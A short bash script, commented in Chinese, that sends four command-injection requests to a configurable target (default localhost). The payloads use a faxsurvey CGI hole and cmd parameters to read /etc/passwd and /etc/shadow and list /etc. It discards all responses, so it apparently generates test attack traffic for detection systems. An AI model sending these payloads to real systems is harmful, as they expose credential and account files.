#!/bin/bash
# 木马通信 + 恶意命令攻击脚本
# 用法: TARGET=127.0.0.1:8080 ./trojan.sh

TARGET="${TARGET:-127.0.0.1:8080}"
echo "[木马+恶意命令] 开始攻击 $TARGET ..."
sleep 1

echo "  [1/4] faxsurvey 木马"
curl -s "http://$TARGET/faxsurvey?/bin/cat%20/etc/passwd" > /dev/null
sleep 0.3

echo "  [2/4] /bin/cat /etc/shadow"
curl -s "http://$TARGET/admin/exec?cmd=/bin/cat%20/etc/shadow" > /dev/null
sleep 0.3

echo "  [3/4] /bin/ls 信息收集"
curl -s "http://$TARGET/cgi-bin/status?cmd=/bin/ls%20-la%20/etc/" > /dev/null
sleep 0.3

echo "  [4/4] /etc/passwd 文件读取"
curl -s "http://$TARGET/cgi-bin/status?cmd=/bin/cat%20/etc/passwd" > /dev/null
sleep 0.3

echo "[木马+恶意命令] 完成 (4 次攻击)"
